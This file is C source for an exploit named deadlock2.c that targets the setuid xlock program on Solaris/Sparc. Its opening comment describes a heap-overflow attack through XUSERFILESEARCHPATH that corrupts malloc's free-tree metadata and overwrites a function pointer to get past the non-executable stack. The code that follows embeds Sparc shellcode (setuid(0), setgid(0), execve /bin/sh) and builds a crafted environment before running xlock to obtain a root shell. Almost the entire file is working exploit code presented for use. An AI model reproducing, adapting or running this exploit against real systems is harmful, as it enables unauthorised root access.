/*
 * Created: September 3, 2001
 * Updated: September 4, 2001
 *   ______
 *  /   ___\ __ _  ____  ____  ____ ____ ____  __ _
 *  \____  \/  / \/    \/    \/  _ \    \ _  \/  / \
 * /        \___  \  \  \  \  \ ___/  \_/___  \___  \
 * \______  / ____/__/  /__/  /___ \__/ / ____/ ____/
 *        \/\/        \/    \/    \/    \/    \/
 *
 * deadlock2.c versus Solaris/Sparc xlock
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF SYNNERGY
 * Copyright (C) 2001 MaXX <maxx@synnergy.net>
 *
 * The first version of the present exploit, deadlock.c, stored
 * and executed a shellcode on the stack. Therefore it did not run
 * successfully against Solaris/Sparc systems whose /etc/system file
 * activated the noexec_user_stack protection.
 *
 * I first thought it would be easy to bypass this protection since I
 * could as well store the shellcode in the heap (indeed, the heap is
 * executable even if noexec_user_stack is activated), but the address
 * of the shellcode was stored in a NUL terminated character string and
 * unfortunately addresses in the heap begin with a NUL byte..
 *
 * deadlock2.c instead stores the address of the shellcode (and the
 * associated fake malloc structure) on the stack, among the environment
 * variables (where NUL bytes can be stored), and also changes the size
 * field (t_s) of the realfreed (and previously corrupted) memory block
 * (NEXT_BLOCK) in order to trick malloc into believing that the next
 * contiguous block is in fact located on the stack.
 *
 * Unfortunately, the memory area between the heap and the stack is
 * not entirely composed of available memory, and xlock will therefore
 * segfault in the middle of the XOpenDisplay() function. Moreover, no
 * executed saved pc can be corrupted (with the address of the shellcode
 * (minus 8 bytes)) before XOpenDisplay() is called because the Sparc
 * processor seems to prefetch the overwrite instruction before the
 * ret/restore operations are executed (if I run such a version of
 * the exploit with gdb I obtain a shell, but without gdb I reach
 * XOpenDisplay() just as if I did not corrupt the saved pc at all).
 *
 * deadlock2.c therefore overwrites the _XInitDisplayLock_fn function
 * pointer called at the beginning of XOpenDisplay() (the address of
 * _XInitDisplayLock_fn can be obtained via gdb for example, and the
 * address of the 1024 bytes buffer returned by malloc() and overflowed
 * with the value of the XUSERFILESEARCHPATH environment variable can be
 * obtained via truss for example).
 *
 * Thanks to Kaliban for enabling the noexec_user_stack protection on
 * his Solaris/Sparc box without notifying me before ;)
 *
 * -- MaXX
 */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define WORDSIZE sizeof(WORD)
#define ALIGN 8
typedef union _w_ {
    size_t w_i;
    struct _t_ * w_p;
    char w_a[ ALIGN ];
} WORD;
typedef struct _t_ {
    WORD t_s;
    WORD t_p;
    WORD t_l;
    WORD t_r;
    WORD t_n;
    WORD t_d;
} TREE;
#define SIZE( b ) ( ((b)->t_s).w_i )
#define LEFT( b ) ( ((b)->t_l).w_p )
#define LINKFOR( b ) ( ((b)->t_n).w_p )
#define LINKBAK( b ) ( ((b)->t_p).w_p )
#define SETNOTREE( b ) ( LEFT(b) = (TREE *)(-1) )
#define BIT0 (01)
#define BIT1 (02)

char shellcode[] =
    /* setuid( 0 ); */
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x08"
    /* setgid( 0 ); */
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x08"
    /* execve( "/bin/sh", {"/bin/sh", NULL}, NULL ); */
    "\x31\x0b\xd8\x9a\xb0\x16\x21\x6e\x33\x0b\xdc\xda\x90\x13\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1b\x80\x0e\x9c\x03\xa0\x10\xf0\x23\xbf\xf0"
    "\xf2\x23\xbf\xf4\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b"
    "\x91\xd0\x20\x08\x90\x10\x20\x2a\x82\x10\x20\x01\x91\xd0\x20\x08"
    /* call */
    "\x7f\xff\xff\xe8\x01nop";
#define CALL_SIZE 8

#define TREE_KEY "TREE"
#define BUFFER_KEY "XUSERFILESEARCHPATH"
#define BUFFER_SIZE 1024
#define DUMMY_BYTE 0x42
#define DUMMY_SIZE 0xdefaced
#define DUMMY_ALIGNMENT ""
#define BLOCK ( 0x1139d0 - WORDSIZE )
#define CODE_ADDRESS ( BLOCK + sizeof(TREE) + sizeof(shellcode)-1 - CALL_SIZE )
#define FUNCTION_POINTER 0xff31f29c
#define NEXT_BLOCK ( BLOCK + BUFFER_SIZE + WORDSIZE )
#define XLOCK "/usr/openwin/bin/xlock"

/* alignment() */
int alignment( void * pointer )
{
    return( (size_t)pointer % ALIGN );
}

/* nul() */
int nul( void * pointer )
{
    int i;

    for ( i = 0; i < sizeof(pointer); i++ ) {
        if ( ((char *)(&pointer))[i] == '\0' ) {
            return( -1 );
        }
    }
    return( 0 );
}

/* main() */
int main( int argc, char * argv[], char * envp[] )
{
    char * p_tree;

    p_tree = getenv( TREE_KEY );
    if ( p_tree == NULL ) {
        char tree[ sizeof(TREE)+1 ];
        char * p;
        char buffer[ sizeof(BUFFER_KEY) + BUFFER_SIZE + sizeof(TREE) + 1 ];
        size_t size;
        int i;
        char ** execve_envp;
        char * execve_argv[] = { NULL, NULL };

        memset( tree, DUMMY_BYTE, sizeof(TREE) );
        SIZE( (TREE *)tree ) = (size_t)( DUMMY_SIZE );

        p = buffer;
        memcpy( p, BUFFER_KEY"=", sizeof(BUFFER_KEY) );
        p += sizeof(BUFFER_KEY);
        memset( p, DUMMY_BYTE, BUFFER_SIZE );
        memcpy( p + sizeof(TREE)-WORDSIZE, shellcode, sizeof(shellcode)-1 );
        p += BUFFER_SIZE;
        memcpy( p, tree, sizeof(TREE) );
        p += sizeof(TREE);
        *p = '\0';

        memset( tree, DUMMY_BYTE, sizeof(TREE) );
        tree[ sizeof(TREE) ] = '\0';
        SIZE( (TREE *)tree ) = (size_t)( (-WORDSIZE & ~BIT0) & ~BIT1 );
        LINKBAK( (TREE *)tree ) = (TREE *)( CODE_ADDRESS );
        SETNOTREE( (TREE *)tree );
        LINKFOR((TREE *)tree) = (TREE *)(FUNCTION_POINTER-offsetof(TREE,t_p));

        size = 1 + 1 + 1;
        for ( i = 0; i < sizeof(tree); i++ ) {
            if ( tree[i] == '\0' ) {
                size++;
            }
        }

        execve_envp = malloc( (size + 1) * sizeof(char *) );
        if ( execve_envp == NULL ) {
            return( -1 );
        }
        i = 0;
        execve_envp[ i++ ] = DUMMY_ALIGNMENT;
        execve_envp[ i++ ] = buffer;
        execve_envp[ i++ ] = TREE_KEY"=";
        for ( p = tree; i < size; p += strlen(p)+1 ) {
            execve_envp[ i++ ] = p;
        }
        execve_envp[ i ] = NULL;

        execve_argv[ 0 ] = argv[ 0 ];
        execve( execve_argv[0], execve_argv, execve_envp );
        return( -1 );
    } else {
        if ( alignment(p_tree+1) || nul(p_tree+1 - (NEXT_BLOCK + WORDSIZE)) ) {
            size_t size;
            char * p_alignment;

            size = strlen( envp[0] ) + 1;
            p_alignment = malloc( size + 1 );
            if ( p_alignment == NULL ) {
                return( -1 );
            }
            memset( p_alignment, DUMMY_BYTE, size );
            p_alignment[ size ] = '\0';
            envp[ 0 ] = p_alignment;

            execve( argv[0], argv, envp );
            return( -1 );
        } else {
            size_t size;

            size = (size_t)p_tree+1 - ( NEXT_BLOCK + WORDSIZE );
            size = ( size | BIT0 ) & ~BIT1;
            memcpy( getenv(BUFFER_KEY) + BUFFER_SIZE, &size, sizeof(size) );

            argv[ 0 ] = XLOCK;
            execve( argv[0], argv, envp );
            return( -1 );
        }
    }
    return( -1 );
}

